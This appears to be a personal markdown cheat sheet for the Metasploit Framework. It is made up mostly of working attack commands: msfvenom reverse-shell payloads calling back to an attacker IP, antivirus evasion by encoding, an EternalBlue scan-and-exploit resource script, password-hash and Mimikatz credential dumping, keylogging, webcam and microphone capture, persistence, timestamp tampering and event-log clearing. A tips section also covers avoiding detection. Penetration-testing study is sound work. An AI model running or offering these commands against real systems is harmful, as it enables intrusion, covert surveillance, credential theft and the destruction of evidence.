---
title: Metasploit Complete Cheat Sheet
date: 2025-04-30
tags: [security, metasploit, pentesting, hacking, cheatsheet, reference]
alias: [MSF Cheatsheet]
---

# Metasploit Complete Cheat Sheet

## 🔍 Quick Reference

> *For when you need commands at a glance during active sessions*

### Core Commands
- `search <term>` - Find modules
- `use <module_path>` - Select module
- `info` - View module details
- `show options` - Display module settings
- `back` - Exit current module
- `exit` / `quit` - Exit Metasploit

### Target Configuration
- `set RHOSTS <IP>` - Set target IP
- `set RPORT <port>` - Set target port
- `set LHOST <IP>` - Set attacker IP
- `set LPORT <port>` - Set attacker port
- `show payloads` - List compatible payloads
- `set payload <payload>` - Select payload

### Execution
- `exploit` / `run` - Execute module
- `exploit -j` - Run as background job
- `check` - Test if target is vulnerable

### Session Management
- `sessions` - List active sessions
- `sessions -i <ID>` - Interact with session
- `background` - Background current session
- `jobs -l` - List background jobs
- `jobs -k <ID>` - Kill background job

### Meterpreter Essentials
- `sysinfo` - System information
- `getuid` - Current user
- `ps` - Process list
- `shell` - Access system shell
- `download <file>` - Download file from target
- `upload <file>` - Upload file to target
- `screenshot` - Capture screen
- `hashdump` - Extract password hashes
- `getsystem` - Privilege escalation
- `background` - Background session

---

## 📚 Comprehensive Guide

> *Detailed reference with examples and advanced options*

### Introduction
The Metasploit Framework is a powerful open-source platform for developing, testing, and executing exploit code against remote target systems. This comprehensive reference is organized by task type to help you quickly find the commands you need.

**Legend:**
- Basic commands are listed first in each section
- Advanced options follow with additional examples
- Code blocks show sample usages or scripts

### Getting Started

| Command | Description |
|---------|-------------|
| `msfdb init` | Initialize the Metasploit database |
| `msfconsole` | Start the Metasploit Framework console |
| `msfconsole -q` | Start console quietly (no banner) |
| `msfconsole -r script.rc` | Start and load resource script |
| `help` | Display help menu |
| `version` | Display version information |

### Core Commands

#### Navigation and Module Selection
| Command | Description | Example |
|---------|-------------|---------|
| `search <term>` | Find modules by keyword | `search apache` |
| `search type:exploit platform:windows` | Advanced search with filters | `search type:exploit cve:2021` |
| `use <module_path>` | Select a module to use | `use exploit/windows/smb/ms17_010_eternalblue` |
| `back` | Exit current module | `back` |
| `exit` / `quit` | Exit Metasploit console | `exit` |
| `help` | Display help menu | `help` |
| `help <command>` | Get help for specific command | `help search` |

#### Module Information
| Command | Description | Example |
|---------|-------------|---------|
| `info` | Display detailed module information | `info` |
| `show options` | Display module configuration options | `show options` |
| `show payloads` | List compatible payloads for selected exploit | `show payloads` |
| `show targets` | Display available targets for exploit | `show targets` |
| `show advanced` | Show advanced options | `show advanced` |
| `show evasion` | Show evasion options | `show evasion` |
| `check` | Verify if target is vulnerable without exploiting | `check` |

### Configuration

#### Target and Attack Setup
| Command | Description | Example |
|---------|-------------|---------|
| `set RHOSTS <IP>` | Set target IP address or range | `set RHOSTS 192.168.1.10` |
| `set RHOSTS <range>` | Set IP range | `set RHOSTS 192.168.1.1-254` |
| `set RHOSTS <CIDR>` | Set network with CIDR notation | `set RHOSTS 192.168.1.0/24` |
| `set RPORT <port>` | Set target port | `set RPORT 445` |
| `set LHOST <IP>` | Set attacker IP for callbacks | `set LHOST 192.168.1.5` |
| `set LPORT <port>` | Set attacker port for callbacks | `set LPORT 4444` |
| `set payload <payload>` | Specify payload to use | `set payload windows/meterpreter/reverse_tcp` |
| `set target <ID>` | Select specific target from list | `set target 0` |
| `setg <option> <value>` | Set global option | `setg LHOST 192.168.1.5` |
| `unset <option>` | Clear option value | `unset RPORT` |
| `unsetg <option>` | Clear global option | `unsetg LHOST` |
| `save` | Save current settings to config file | `save` |

#### Common Payload Types

| Payload | Description |
|---------|-------------|
| `windows/meterpreter/reverse_tcp` | Windows Meterpreter, reverse TCP connection |
| `windows/meterpreter/reverse_https` | Windows Meterpreter over HTTPS (more stealthy) |
| `linux/x86/meterpreter/reverse_tcp` | Linux Meterpreter, reverse TCP connection |
| `python/meterpreter/reverse_tcp` | Python Meterpreter, reverse TCP connection |
| `java/jsp_shell_reverse_tcp` | JSP shell, reverse TCP connection |
| `php/meterpreter_reverse_tcp` | PHP Meterpreter, reverse TCP connection |
| `osx/x64/meterpreter/reverse_tcp` | macOS Meterpreter, reverse TCP connection |

### Execution

#### Running Exploits and Auxiliary Modules
| Command | Description | Example |
|---------|-------------|---------|
| `exploit` / `run` | Execute the exploit with configured options | `exploit` |
| `exploit -j` | Run exploit as background job | `exploit -j` |
| `exploit -z` | Run exploit and don't interact with session | `exploit -z` |
| `exploit -e <encoder>` | Use specific encoder | `exploit -e x86/shikata_ga_nai` |
| `exploit -h` | Display help for exploit command | `exploit -h` |
| `run` | Alternative for exploit | `run` |
| `rerun` | Run the module with previous settings | `rerun` |

### Session Management

#### Session Commands
| Command | Description | Example |
|---------|-------------|---------|
| `sessions` | List all active sessions | `sessions` |
| `sessions -i <ID>` | Interact with specific session | `sessions -i 1` |
| `sessions -k <ID>` | Terminate specific session | `sessions -k 1` |
| `sessions -K` | Kill all sessions | `sessions -K` |
| `sessions -u <ID>` | Upgrade shell to meterpreter | `sessions -u 1` |
| `sessions -c <cmd>` | Execute command on session | `sessions -c "whoami" 1` |
| `background` | Send current session to background | `background` |
| `jobs -l` | List background jobs | `jobs -l` |
| `jobs -k <ID>` | Kill specific background job | `jobs -k 1` |
| `jobs -K` | Kill all jobs | `jobs -K` |

### Meterpreter Commands

#### System Information and Control
| Command | Description | Example |
|---------|-------------|---------|
| `sysinfo` | Display system information | `sysinfo` |
| `getuid` | Show current user identity | `getuid` |
| `getpid` | Display current process ID | `getpid` |
| `getprivs` | Show current privileges | `getprivs` |
| `ps` | List running processes | `ps` |
| `kill <PID>` | Terminate process by ID | `kill 1234` |
| `shell` | Access system shell | `shell` |
| `getsystem` | Attempt privilege escalation | `getsystem` |
| `hashdump` | Dump password hashes | `hashdump` |
| `run post/windows/gather/hashdump` | Alternative hash dumping | `run post/windows/gather/hashdump` |
| `load kiwi` | Load Mimikatz extension | `load kiwi` |
| `creds_all` | Dump all credentials (Kiwi) | `creds_all` |
| `run post/windows/manage/enable_rdp` | Enable Remote Desktop | `run post/windows/manage/enable_rdp` |

#### File System Operations
| Command | Description | Example |
|---------|-------------|---------|
| `pwd` / `getwd` | Print working directory | `pwd` |
| `cd <directory>` | Change directory | `cd C:\\Users` |
| `ls` | List files in current directory | `ls` |
| `cat <file>` | Display file contents | `cat config.txt` |
| `edit <file>` | Edit file on target | `edit passwords.txt` |
| `download <file>` | Download file from target | `download passwords.txt` |
| `download <file> <location>` | Download to specific location | `download secrets.db /home/kali/loot/` |
| `upload <file>` | Upload file to target | `upload backdoor.exe` |
| `mkdir <directory>` | Create new directory | `mkdir secret` |
| `rm <file>` | Delete file | `rm evidence.log` |
| `search -f <filename>` | Find files on target | `search -f *.pdf` |
| `timestomp <file>` | Modify file timestamps | `timestomp important.doc -f reference.doc` |

#### Network and System Monitoring
| Command | Description | Example |
|---------|-------------|---------|
| `ipconfig` / `ifconfig` | Show network interfaces | `ipconfig` |
| `netstat` | Display network connections | `netstat` |
| `route` | View/modify network routing table | `route` |
| `portfwd` | Port forwarding | `portfwd add -l 8080 -p 80 -r 192.168.1.10` |
| `arp` | Display ARP cache | `arp` |
| `screenshot` | Capture screen | `screenshot` |
| `record_mic <seconds>` | Record from microphone | `record_mic 10` |
| `webcam_list` | List available webcams | `webcam_list` |
| `webcam_snap` | Take webcam snapshot | `webcam_snap` |
| `webcam_stream` | Start webcam stream | `webcam_stream` |
| `keyscan_start` | Start keylogger | `keyscan_start` |
| `keyscan_dump` | View captured keystrokes | `keyscan_dump` |
| `keyscan_stop` | Stop keylogger | `keyscan_stop` |

#### Process and Memory Operations
| Command | Description | Example |
|---------|-------------|---------|
| `ps` | List processes | `ps` |
| `migrate <PID>` | Migrate to another process | `migrate 1234` |
| `migrate -N <name>` | Migrate to process by name | `migrate -N explorer.exe` |
| `execute -f <program>` | Execute program on target | `execute -f calc.exe` |
| `execute -H -f <cmd>` | Execute hidden program | `execute -H -f cmd.exe` |
| `mem` | Display memory usage | `mem` |
| `run post/windows/gather/memory_grep` | Search process memory | `run post/windows/gather/memory_grep` |

### Post-Exploitation Modules

#### Windows Post Modules

| Command | Description |
|---------|-------------|
| `run post/windows/gather/credentials/credential_collector` | Collect credentials |
| `run post/windows/gather/enum_applications` | Enumerate installed applications |
| `run post/windows/gather/enum_services` | Enumerate services |
| `run post/windows/gather/enum_logged_on_users` | Enumerate logged on users |
| `run post/windows/gather/checkvm` | Check if system is a VM |
| `run post/windows/gather/enum_domains` | Enumerate domains and domain controllers |
| `run post/windows/manage/enable_rdp` | Enable Remote Desktop |
| `run post/windows/manage/enable_privileges` | Enable privileges |
| `run post/windows/gather/enum_shares` | Enumerate shares |
| `run post/windows/gather/enum_snmp` | Enumerate SNMP |

#### Linux Post Modules

| Command | Description |
|---------|-------------|
| `run post/linux/gather/enum_system` | Gather system information |
| `run post/linux/gather/enum_configs` | Enumerate configurations |
| `run post/linux/gather/enum_network` | Enumerate network |
| `run post/linux/gather/enum_users_history` | Enumerate user history |
| `run post/linux/gather/checkvm` | Check if system is a VM |
| `run post/linux/gather/hashdump` | Dump password hashes |

### Database Integration

#### Database Commands
| Command | Description | Example |
|---------|-------------|---------|
| `db_status` | Check database connection status | `db_status` |
| `db_connect` | Connect to database | `db_connect postgresql://user:pass@127.0.0.1/msf` |
| `db_disconnect` | Disconnect from database | `db_disconnect` |
| `db_nmap` | Run Nmap and record to database | `db_nmap -sV 192.168.1.0/24` |
| `hosts` | List hosts in database | `hosts` |
| `hosts -c address,os_name` | List hosts with specific columns | `hosts -c address,os_name` |
| `services` | List services in database | `services` |
| `services -p 445` | List services on specific port | `services -p 445` |
| `vulns` | List vulnerabilities in database | `vulns` |
| `loot` | List loot in database | `loot` |
| `notes` | List notes in database | `notes` |
| `workspace` | List workspaces | `workspace` |
| `workspace -a <name>` | Add workspace | `workspace -a projectX` |
| `workspace -d <name>` | Delete workspace | `workspace -d projectX` |
| `workspace <name>` | Switch workspace | `workspace projectX` |

### Advanced Features

#### Resource Scripts
| Command | Description | Example |
|---------|-------------|---------|
| `makerc <file>` | Save commands to resource file | `makerc autoexploit.rc` |
| `resource <file>` | Execute commands from resource file | `resource autoexploit.rc` |

#### Example Resource Script

```ruby
# Example resource script for automated scanning and exploitation
# Save as scan_exploit.rc and run with: msfconsole -r scan_exploit.rc

# Set global variables
setg RHOSTS 192.168.1.0/24
setg THREADS 10

# Scan network for SMB services
use auxiliary/scanner/smb/smb_version
run

# Find potential EternalBlue targets
use auxiliary/scanner/smb/smb_ms17_010
run

# Attempt to exploit vulnerable systems
use exploit/windows/smb/ms17_010_eternalblue
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
run
```

**How to use resource scripts:**
1. Create a text file with the commands you want to automate
2. Run with `msfconsole -r yourscript.rc` or use `resource yourscript.rc` from within msfconsole

### MSFVenom Payload Generation

#### Basic Syntax
```bash
msfvenom -p <payload> <options> -f <format> -o <output_file>
```

#### Common Payloads by Platform

| Target Platform | Command Example | Description |
|-----------------|----------------|-------------|
| **Windows** | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe` | Executable reverse shell |
| **Linux** | `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o payload.elf` | ELF binary reverse shell |
| **Web** | `msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.php` | PHP web shell |
| **Java** | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f war -o shell.war` | Java WAR file |
| **Python** | `msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o payload.py` | Python script |
| **Android** | `msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o payload.apk` | Android application |

#### Encoding and Obfuscation

```bash
# Encode payload to evade antivirus
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o encoded_payload.exe

# List available encoders
msfvenom --list encoders

# List available formats
msfvenom --list formats

# List available payloads
msfvenom --list payloads
```

### Multi-Handler for Catching Connections

```ruby
# Basic handler setup
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
run

# To keep the handler running after session is established
set ExitOnSession false
exploit -j
```

> *The multi-handler is essential for receiving connections from payloads generated with MSFVenom*

## Tips and Best Practices

| Category | Tips |
|----------|------|
| **Reconnaissance** | • Always scan before exploiting<br>• Use `db_nmap` to save results to database<br>• Use `check` command when available before exploiting |
| **Session Management** | • Use `background` (not Ctrl+Z) to background sessions<br>• Name sessions with `sessions -n "Description" -i <ID>`<br>• Use `sessions -u <ID>` to upgrade shells to Meterpreter |
| **Payload Selection** | • Use HTTPS payloads for stealth (`reverse_https`)<br>• For unstable connections: `set AutoRunScript migrate -f`<br>• Staged payloads (with /) are smaller but need handler<br>• Non-staged payloads (with _) are more reliable but larger |
| **Database Usage** | • Always use database for large engagements<br>• Create workspaces for different projects<br>• Export results with `db_export` for reporting |
| **Avoiding Detection** | • Use proxychains for anonymity<br>• Use encoders to evade antivirus<br>• Use uncommon ports (not 4444)<br>• Migrate to stable processes quickly |
| **Resource Scripts** | • Create scripts for repetitive tasks<br>• Use `-r` flag to load at startup<br>• Chain multiple scripts together |
| **Maintaining Access** | • Use `run persistence` for persistent access<br>• Use `keyscan_start` to capture credentials<br>• Use port forwarding for internal network access |
| **Documentation** | • Use `spool` to log console activity<br>• Take notes with `notes` command<br>• Save loot with `loot` command |

## Workflow Example

Below is a typical penetration testing workflow using Metasploit:

### Reconnaissance & Scanning
```ruby
# Start Metasploit with database
msfdb init
msfconsole

# Create a workspace for this engagement
workspace -a clientX

# Scan the network
db_nmap -sV -p- 192.168.1.0/24

# Review discovered hosts and services
hosts
services -p 445 --rhosts
```

### Exploitation
```ruby
# Target vulnerable service
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set LHOST 192.168.1.100
check                                # Always check first when possible
set payload windows/x64/meterpreter/reverse_tcp
exploit
```

### Post-Exploitation
```ruby
# Initial reconnaissance
getuid
sysinfo
hashdump

# Elevate privileges if needed
getsystem
getuid

# Gather credentials
load kiwi
creds_all
run post/windows/gather/enum_applications

# Maintain access
run persistence -S -i 60 -p 443 -r 192.168.1.100
```

### Clean-up
```ruby
# Remove evidence
clearev

# Exit meterpreter
exit
# Exit metasploit
exit
```

## References and Additional Resources

- [Metasploit Documentation](https://docs.metasploit.com/)
- [Offensive Security Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
- [Rapid7 Blog](https://blog.rapid7.com/)
- [Metasploit GitHub Repository](https://github.com/rapid7/metasploit-framework)
